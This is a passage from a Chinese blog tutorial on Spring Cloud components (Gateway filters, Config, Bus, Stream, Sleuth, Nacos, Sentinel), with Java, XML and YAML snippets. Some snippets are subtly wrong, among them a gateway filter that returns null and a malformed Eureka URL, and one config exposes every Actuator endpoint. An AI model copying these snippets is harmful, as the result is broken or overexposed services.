title="Filter的使用：主要是自定义过滤器"></a>Filter的使用：主要是自定义过滤器</h4><p>路由过滤器可用于修改进入的HTTP请求和返回的HTTP响应，路由过滤器只能指定路由进行使用。Spring Cloud Gateway内置了多种路由过滤器,他们都由GatewayFilter的工厂类来产生</p><blockquote><p>过滤器类似于Spring的拦截器可以进行生成日志、鉴权等工作</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.springcloud.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/7/18 11:19</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLogGateWayFilter</span> <span class="keyword">implements</span> <span class="title">GlobalFilter</span>, <span class="title">Ordered</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Mono&lt;Void&gt; <span class="title">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"************come in MyLogGateWayFilter: "</span> + <span class="keyword">new</span> Date());</span><br><span class="line">        String uname = exchange.getRequest().getQueryParams().getFirst(<span class="string">"uname"</span>);</span><br><span class="line">        <span class="keyword">if</span>(uname == <span class="keyword">null</span>)&#123;</span><br><span class="line">            log.info(<span class="string">"************用户非法"</span>);</span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.NOT_ACCEPTABLE);</span><br><span class="line">            <span class="comment">/*设置完成*/</span></span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getOrder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//order代表加载过滤器的顺序，数字越小优先级越高</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><p>分布式微服务配置中心</p><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置中心--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-config-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3344</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-config-center</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">server:</span></span><br><span class="line">        <span class="attr">git:</span> </span><br><span class="line">          <span class="attr">uri:</span> <span class="string">xxxxxxxxxx</span> <span class="comment">##建议使用https，ssh需要认证</span></span><br><span class="line">          <span class="attr">search-paths:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">springcloud-config</span></span><br><span class="line">          <span class="comment">## 私有库设置git账号密码</span></span><br><span class="line">          <span class="attr">username:</span> <span class="string">xxxx</span></span><br><span class="line">          <span class="attr">password:</span> <span class="string">xxxxx</span></span><br><span class="line">          <span class="comment">## 分支</span></span><br><span class="line">        <span class="attr">default-label:</span> <span class="string">master</span></span><br><span class="line"><span class="attr">eureka:</span> <span class="comment">##注册到eureka</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure><blockquote><p>主启动类添加注解</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@EnableConfigServer</span> <span class="comment">//添加该注解</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigCenterMain3344</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(ConfigCenterMain3344<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>访问格式 1</p></blockquote><p><code>http://loacalhost:port/{label}/{application}-{profile}.yml</code></p><p>其中{label}代表分支，可以省略，默认是master分支</p><p>{application}-{profile}.yml是文件名</p><p>{profile}一般是指明环境：开发，测试，发布等</p><blockquote><p>访问格式 2</p></blockquote><p>逆向url访问，得到的是json字符串</p><h4 id="客户端配置与测试"><a href="#客户端配置与测试" class="headerlink" title="客户端配置与测试"></a>客户端配置与测试</h4><blockquote><p>POM文件引入客户端</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置中心客户端--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bootstrap.yml加载外部源</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3355</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">config-client</span></span><br><span class="line">  <span class="attr">cloud:</span> <span class="comment">#Config客户端配置</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">master</span> <span class="comment">#分支名称</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">config</span> <span class="comment">#配置文件名称</span></span><br><span class="line">      <span class="attr">profile:</span> <span class="string">dev</span> <span class="comment">#读取后缀名称</span></span><br><span class="line">      <span class="attr">uri:</span> <span class="string">http://localhost:3344</span> <span class="comment">#配置中心地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务注册到eureka地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure><blockquote><p>控制层注入配置</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.springcloud.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/7/19 15:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigClientController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"&#123;spring.application.name&#125;"</span>) <span class="comment">//这里填写远程yml信息</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/configInfo"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Config动态刷新"><a href="#Config动态刷新" class="headerlink" title="Config动态刷新"></a>Config动态刷新</h4><p>默认情况下客户端读取的数据不会随着github仓库动态刷新，每次都需要重启客户端，很烦:cry:</p><blockquote><p>解决办法——&gt;手动刷新</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#步骤如下：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#POM引入actuator监控</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改YML，暴露监控端点</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">	<span class="attr">endpoints:</span></span><br><span class="line">		<span class="attr">web:</span></span><br><span class="line">			<span class="attr">exposure:</span></span><br><span class="line">				<span class="attr">include:</span> <span class="string">"*"</span></span><br><span class="line"><span class="comment">#Controller添加注解： @RefreshScope业务类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#此时修改   github---&gt; 3344 ---&gt;3355</span></span><br></pre></td></tr></table></figure><blockquote><p>修改完之后还需要post命令请求刷新：curl -X POST “<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdC9hY3R1YXRvci9yZWZyZXNoJnF1b3Q7">http://localhost/actuator/refresh&quot;<i class="fa fa-external-link-alt"></i></span></p></blockquote><h3 id="Bus消息总线"><a href="#Bus消息总线" class="headerlink" title="Bus消息总线"></a>Bus消息总线</h3><p>SpringCloud Bus配合SpringCloud Config使用可以实现配置的动态刷新。</p><blockquote><p>:star:利用消息总线触发一个服务端ContigServer的/bus/refresh端点，通过<code>rabbitmq</code>广播刷新<strong>所有</strong>客户端的配置。</p><p>:heavy_exclamation_mark:但是一般不加在config客户端，因为从设计思想上考虑，微服务负责的功能应该单一，应该减少对微服务客户端的侵入。</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200720102146254.png" alt="image-20200720102146254"></p><h3 id="SpringCloud-Stream"><a href="#SpringCloud-Stream" class="headerlink" title="SpringCloud Stream"></a>SpringCloud Stream</h3><p>官方定义Spring Cloud Stream是一个构建消息驱动微服务的框架。应用程序通过inputs或者outputs来与Spring Cloud Streamtlbinder对象交互。通过我们配置来binding(绑定) ,而Spring Cloud Stream的binder对象负责与消息中间件交互。所以，我们只需要搞清楚如何与Spring Cloud Stream交互就可以方便使用消息驱动的方式。通过使用Spring Integration来连接消息代理中间件以实现消息事件驱动。Spring Cloud Stream为一些供应商的消息中间件产品提供了个性化的自动化配置实现,引用了发布-订阅、消费组、分区的三个核心概念。</p><p>目前仅支持RabbitMQ、Kafka.</p><blockquote><p>Binder：很方便的连接中间件，屏蔽差异</p><p>Channel：队列Queue的一种抽象</p><p>Source和Sink：消息输入与输出</p></blockquote><h4 id="生产者-amp-消费者"><a href="#生产者-amp-消费者" class="headerlink" title="生产者&amp;消费者"></a>生产者&amp;消费者</h4><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-stream-rabbit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8801</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-stream-provider</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">stream:</span></span><br><span class="line">      <span class="comment">## bingdings相当于一个绑定实例</span></span><br><span class="line">      <span class="attr">bindings:</span></span><br><span class="line">        <span class="attr">output:</span> <span class="comment">#这个名字是一个通道的名称，可以自定义</span></span><br><span class="line">          <span class="attr">destination:</span> <span class="string">studyExchange</span> <span class="comment">#表示要使用Exchange名称定义</span></span><br><span class="line">          <span class="attr">content-type:</span> <span class="string">application/json</span> <span class="comment">#设置消息类型，本次为json， 文本则没置"text/plain'</span></span><br><span class="line">          <span class="attr">binder:</span> <span class="string">defaultRabbit</span> <span class="comment">#绑定的名称</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">#binder: 设置要绑定的消息服务的具体设置</span></span><br><span class="line">      <span class="attr">binders:</span></span><br><span class="line">        <span class="attr">defaultRabbit:</span>  <span class="comment">#表示定义的名称，用于binding整合</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">rabbit</span> <span class="comment">#消息组件类型</span></span><br><span class="line">          <span class="attr">environment:</span></span><br><span class="line">            <span class="attr">spring:</span></span><br><span class="line">              <span class="attr">rabbitmq:</span></span><br><span class="line">                <span class="attr">host:</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.106</span> <span class="comment">#rabbit地址</span></span><br><span class="line">                <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">                <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">                <span class="attr">password:</span> <span class="string">guest</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http:localhost:7001/eureka/</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">lease-renewal-interval-in-seconds:</span> <span class="number">2</span> <span class="comment">#心跳间隔</span></span><br><span class="line">    <span class="attr">lease-expiration-duration-in-seconds:</span> <span class="number">5</span> <span class="comment">#持续时间</span></span><br><span class="line">    <span class="attr">instance-id:</span> <span class="string">send-8801.com</span> <span class="comment">#主机名称</span></span><br><span class="line">    <span class="attr">prefer-ip-address:</span> <span class="literal">true</span> <span class="comment">#访问路径变为IP地址</span></span><br></pre></td></tr></table></figure><blockquote><p>发送服务</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableBinding</span>(Source<span class="class">.<span class="keyword">class</span>) //定义消息的推送管道：生产方使用<span class="title">source</span></span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">IMessageProviderImpl</span> <span class="keyword">implements</span> <span class="title">IMessageProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> MessageChannel output; <span class="comment">//消息发送管道</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">send</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String serial = UUID.randomUUID().toString();</span><br><span class="line">        <span class="comment">/*MessageBuilder使用建造者模式*/</span></span><br><span class="line">        output.send(MessageBuilder.withPayload(serial).build());</span><br><span class="line">        System.out.println(<span class="string">"******serial: "</span> + serial);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="重复消费问题"><a href="#重复消费问题" class="headerlink" title="重复消费问题"></a>重复消费问题</h4><p>如果同一个订单被两个服务获取到，那么就会造成数据错误，Stream中使用group解决。同样一个group内多个消费者是竞争关系。</p><h3 id="Sleuth"><a href="#Sleuth" class="headerlink" title="Sleuth"></a>Sleuth</h3><p>在微服务框架中，一个由客户端发起的请求在后端系统中会经过多个不同的的服务节点调用来协同产生最后的请求结果，每一个前段请求都会彩成一条复杂的分布式服务调用链路,链路中的任何一环出现高延时或错误都会引起整个请求最后的失败。<code>Sleuth</code>是一款分布式链路跟踪组件</p><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--sleuth包含了zipkin--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zipkin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">zipkin:</span></span><br><span class="line">  <span class="attr">base-url:</span> <span class="string">http://localhost:9411</span> <span class="comment">#管理界面</span></span><br><span class="line"><span class="attr">sleuth:</span></span><br><span class="line">  <span class="attr">sampler:</span></span><br><span class="line">    <span class="attr">probability:</span> <span class="number">1</span> <span class="comment">#采样率在0-1之间，1表示全部采集</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：Sleuth在调用链上每个微服务节点的配置<strong>完全相同</strong>，下面开启监控即可查看调用链。</p></blockquote><p>ref: <span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9mMTc3YTVlMjkxN2Y=">https://www.jianshu.com/p/f177a5e2917f<i class="fa fa-external-link-alt"></i></span></p><h3 id="SpringCloud-Alibaba"><a href="#SpringCloud-Alibaba" class="headerlink" title="SpringCloud Alibaba"></a>SpringCloud Alibaba</h3><h4 id="Nacos–服务注册配置中心"><a href="#Nacos–服务注册配置中心" class="headerlink" title="Nacos–服务注册配置中心"></a>Nacos–服务注册配置中心</h4><p>更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。<br>Nacos: Dynamic Naming and Configuration Service<br>Nacos就是注册中心+配置中心的组合</p><ul><li>替代Eureka做服务注册中心</li><li>替代Config做服务配置中心</li></ul><blockquote><p>下载并体验：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvbmFjb3MvcmVsZWFzZXM=">https://github.com/alibaba/nacos/releases<i class="fa fa-external-link-alt"></i></span></p></blockquote><h4 id="服务注册"><a href="#服务注册" class="headerlink" title="服务注册"></a>服务注册</h4><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML/properties</p></blockquote><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="meta">spring.application.name</span>=<span class="string">nacos-provider</span></span><br><span class="line"><span class="meta">spring.cloud.nacos.discovery.server-addr</span>=<span class="string">127.0.0.1:8848</span></span><br><span class="line"><span class="meta">management.endpoints.web.exposure.include</span>=<span class="string">*</span></span><br></pre></td></tr></table></figure><p>使用IDEA的Copy Configure功能可以直接复制一份微服务，不用重新编写，只需要在VM OPTION那一栏填写指定端口：<code>-Dserver.port</code> = 9011</p><h4 id="CAP"><a href="#CAP" class="headerlink" title="CAP"></a>CAP</h4><p><strong>Nacos支持AP和CP模式切换</strong>，C是所有节点看到的数据是一致的；而A的定义是所有的请求都会收到响应。P是多备份。</p><h4 id="配置中心"><a href="#配置中心" class="headerlink" title="配置中心"></a>配置中心</h4><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--nacos-config--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--nacos-discovery--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bootstrap.yml</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nacos配置</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">	<span class="attr">port:</span> <span class="number">3377</span></span><br><span class="line"><span class="attr">spring:</span> </span><br><span class="line">	<span class="attr">application:</span></span><br><span class="line">		<span class="attr">name:</span> <span class="string">nacos-config-client</span></span><br><span class="line"><span class="attr">cloud:</span></span><br><span class="line">	<span class="attr">nacos:</span></span><br><span class="line">		<span class="attr">discovery:</span></span><br><span class="line">			<span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos 服务注册中心地址</span></span><br><span class="line">		<span class="attr">config:</span></span><br><span class="line">			<span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos 作为配置中心地址</span></span><br><span class="line">			<span class="attr">file-extension:</span> <span class="string">yaml</span> <span class="comment">#指定yaml 格式的配置</span></span><br></pre></td></tr></table></figure><blockquote><p>application.yml</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">	<span class="attr">profiles:</span></span><br><span class="line">		<span class="attr">active:</span> <span class="string">dev</span> <span class="comment">#表示开发环境</span></span><br></pre></td></tr></table></figure><p>Nacos配置中心格式</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200723095951047.png" alt="image-20200723095951047"></p><h4 id="Nacos分类配置"><a href="#Nacos分类配置" class="headerlink" title="Nacos分类配置"></a>Nacos分类配置</h4><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200723100728942.png" alt="image-20200723100728942"></p><ul><li><p>Nacos默认的命名空间是public, Namespace主要用来实现隔离。比防说我们现在有三个环境:开发、测试、产环境,我们就可以创建三个Namespace,不同的Namespace之间是隔离的。</p></li><li><p>Group默认是DEFAULT_ GROUP, Group可以把不同的微服务划分到同一个分组里面去</p></li><li><p>Service就是微服务;一个Service可以包含多个Cluster (集群) ，Nacos默认Cluster是DEFAULT, Cluster是对指定微服务的一个虚拟划分。</p></li><li><p>:star:比如说为了容灾,将Service微服务分别部署在了杭州机房和广州机房,这时就可以给杭州机房的Service微服务起一 个集群名称(HZ)，给广州机房的Service微服务起一 个集群名称(GZ) ，还可以尽量让同一个机房的微服务互相调用,以提升性能。</p></li><li><p>最后是Instance,就是微服务的实例。</p></li></ul><h4 id="Nacos集群和持久化配置"><a href="#Nacos集群和持久化配置" class="headerlink" title="Nacos集群和持久化配置"></a>Nacos集群和持久化配置</h4><ul><li>推荐使用docker安装集群，参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25hY29zLWdyb3VwL25hY29zLWRvY2tlcg==">https://github.com/nacos-group/nacos-docker<i class="fa fa-external-link-alt"></i></span></li><li>安装后会有三个nacos集群，一个mysql。</li><li>Nacos集群一般使用<code>Nginx</code>来反向代理实现负载均衡。</li></ul><p>docker ps查看。</p><h4 id="Sentinel实现熔断与限流"><a href="#Sentinel实现熔断与限流" class="headerlink" title="Sentinel实现熔断与限流"></a>Sentinel实现熔断与限流</h4><blockquote><p><strong>Sentinel</strong>: 分布式系统的流量防卫兵，参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTQlQkIlOEIlRTclQkIlOEQ=">Github<i class="fa fa-external-link-alt"></i></span></p></blockquote><p>Sentinel 分为两个部分:</p><ul><li>核心库（Java 客户端）不依赖任何框架/库，能够运行于所有 Java 运行时环境，同时对 Dubbo / Spring Cloud 等框架也有较好的支持。</li><li>控制台（Dashboard）基于 Spring Boot 开发，打包后可以直接运行，不需要额外的 Tomcat 等应用容器</li></ul><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTYlQjUlODElRTklODclOEYlRTYlOEUlQTclRTUlODglQjYjJUU1JTlGJUJBJUU0JUJBJThFcXBzJUU1JUI5JUI2JUU1JThGJTkxJUU2JTk1JUIwJUU3JTlBJTg0JUU2JUI1JTgxJUU5JTg3JThGJUU2JThFJUE3JUU1JTg4JUI2">QPS和线程数控制<i class="fa fa-external-link-alt"></i></span></p><h4 id="Sentinel流控-关联"><a href="#Sentinel流控-关联" class="headerlink" title="Sentinel流控-关联"></a>Sentinel流控-关联</h4><p>即/A资源关联/B资源，当/B资源受到压力，对/A资源进行流量控制</p><h4 id="Sentinel流控-预热"><a href="#Sentinel流控-预热" class="headerlink" title="Sentinel流控-预热"></a>Sentinel流控-预热</h4><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTklOTklOTAlRTYlQjUlODEtLS0lRTUlODYlQjclRTUlOTAlQUYlRTUlOEElQTg=">Warm Up<i class="fa fa-external-link-alt"></i></span>（<code>RuleConstant.CONTROL_BEHAVIOR_WARM_UP</code>）方式，即预热/冷启动方式。当系统长期处于低水位的情况下，当流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。通过”冷启动”，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮。</p><blockquote><p>默认 <code>coldFactor</code> 为 3，即请求 QPS 从 <code>threshold / 3</code> 开始，经预热时长逐渐升至设定的 QPS 阈值。</p></blockquote><h4 id="Sentinel流控-排队等待"><a href="#Sentinel流控-排队等待" class="headerlink" title="Sentinel流控-排队等待"></a>Sentinel流控-排队等待</h4><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTYlQjUlODElRTklODclOEYlRTYlOEUlQTclRTUlODglQjYtJUU1JThDJTgwJUU5JTgwJTlGJUU2JThFJTkyJUU5JTk4JTlGJUU2JUE4JUExJUU1JUJDJThG">匀速排队<i class="fa fa-external-link-alt"></i></span>（<code>RuleConstant.CONTROL_BEHAVIOR_RATE_LIMITER</code>）方式会严格控制请求通过的间隔时间，也即是让请求以均匀的速度通过，对应的是漏桶算法。</p><h4 id="Sentinel流控-降级"><a href="#Sentinel流控-降级" class="headerlink" title="Sentinel流控-降级"></a>Sentinel流控-降级</h4><p>Sentinel <a 